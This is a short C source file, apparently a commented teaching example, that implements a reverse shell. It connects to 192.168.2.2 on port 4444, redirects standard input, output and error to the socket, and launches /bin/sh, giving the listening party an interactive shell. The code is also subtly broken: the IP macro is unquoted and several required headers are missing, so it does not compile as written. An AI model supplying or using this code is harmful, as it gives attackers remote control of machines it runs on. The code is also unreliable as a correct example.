#include <stdlib.h>
#include <netinet/in.h>

#define CONNECT_TO_IP 192.168.2.2
#define CONNECT_TO_PORT 4444

int main(void) 
{
   int socket_descriptor;
   struct sockaddr_in address;

//CREATE THE SOCKET
   socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
      /* 
      From "man 7 ip"
         struct sockaddr_in {
                        sa_family_t    sin_family; // address family: AF_INET (for IPv4 addresses)
                        in_port_t      sin_port;   // port in network byte order
                        struct in_addr sin_addr;   // internet address
                    };
      */

   address.sin_family = AF_INET; //Address family that is used for the socket you are creating (in this case an IPv4 address)
   address.sin_port = htons(CONNECT_TO_PORT); //Port to connect to
   address.sin_addr.s_addr = inet_addr(CONNECT_TO_IP);//IP address to connect to

//CONNECT TO THE DESTINATION IP/PORT
   connect(socket_descriptor, (struct sockaddr *)&address, sizeof(address));

//SEND AND RECEIVE DATA
//If you dont dup, then you will not be able to interact with your "target".
//Building up file descriptors (0 (standard input), 1 (standard output), 2 (standard error))
//Duplicate a file descriptor "man 2 dup2", the dup system call duplicates an existing file descriptor, returning a new one that refers to the same underlying I/O object.
   dup2(socket_descriptor, 0);
   dup2(socket_descriptor, 1);
   dup2(socket_descriptor, 2);

//COMMAND TO EXECUTE UPON SUCCESSFUL CONNECTION
   execve("/bin/sh", NULL, NULL);
   return 0;
}

